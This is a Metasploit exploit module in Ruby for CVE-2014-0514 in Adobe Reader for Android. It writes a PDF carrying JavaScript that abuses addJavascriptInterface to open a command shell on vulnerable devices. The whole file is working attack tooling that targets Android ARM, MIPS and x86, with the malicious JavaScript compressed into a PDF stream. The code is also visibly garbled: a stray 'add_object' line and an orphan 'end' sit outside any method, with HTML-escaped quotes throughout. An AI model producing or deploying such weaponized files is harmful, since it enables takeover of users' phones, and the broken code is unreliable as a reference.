# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/fileformat&#039;
require &#039;msf/core/exploit/pdf&#039;
require &#039;msf/core/exploit/android&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::PDF
  include Msf::Exploit::Android

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Adobe Reader for Android addJavascriptInterface Exploit&#039;,
      &#039;Description&#039;    => %q{
          Adobe Reader versions less than 11.2.0 exposes insecure native
          interfaces to untrusted javascript in a PDF. This module embeds the browser
          exploit from android/webview_addjavascriptinterface into a PDF to get a
          command shell on vulnerable versions of Reader.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         => [
        &#039;Yorick Koster&#039;, # discoverer
        &#039;joev&#039; # msf module
      ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-0514&#039; ],
          [ &#039;EDB&#039;, &#039;32884&#039; ],
          [ &#039;OSVDB&#039;, &#039;105781&#039; ],
        ],
      &#039;Platform&#039;       => &#039;android&#039;,
      &#039;DefaultOptions&#039; => {
      },
      &#039;Targets&#039;        => [
        [ &#039;Android ARM&#039;, {
            &#039;Platform&#039; => &#039;android&#039;,
            &#039;Arch&#039; => ARCH_ARMLE
          }
        ],
        [ &#039;Android MIPSLE&#039;, {
            &#039;Platform&#039; => &#039;android&#039;,
            &#039;Arch&#039; => ARCH_MIPSLE
          }
        ],
        [ &#039;Android X86&#039;, {
            &#039;Platform&#039; => &#039;android&#039;,
            &#039;Arch&#039; => ARCH_X86
          }
        ]
      ],
      &#039;DisclosureDate&#039; => &#039;Apr 13 2014&#039;,
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options([
      OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.pdf&#039;]),
    ], self.class)
  end

  def exploit
    print_status("Generating Javascript exploit...")
    js = add_javascript_interface_exploit_js(ARCH_ARMLE)
    print_status("Creating PDF...")
    file_create(pdf(js))
  end

  def trailer(root_obj)
    id = @xref.keys.max+1
    "trailer" << eol << "<</Size %d/Root " % id << ioRef(root_obj) << ">>" << eol
  end

    add_object(n, Zlib::Inflate.inflate(Rex::Text.decode_base64(data)))
  end

  def pdf(js)
    self.eol = "\x0d"
    @xref = {}
    @pdf = header(&#039;1.6&#039;)


    js = Zlib::Deflate.deflate(js)
    add_object(46, "\x0d<</Filter[/FlateDecode]/Length #{js.length}>>stream\x0d#{js}\x0dendstream\x0d")


    @xref_offset = @pdf.length
    @pdf << xref_table << trailer(25) << startxref

    @pdf
  end

end

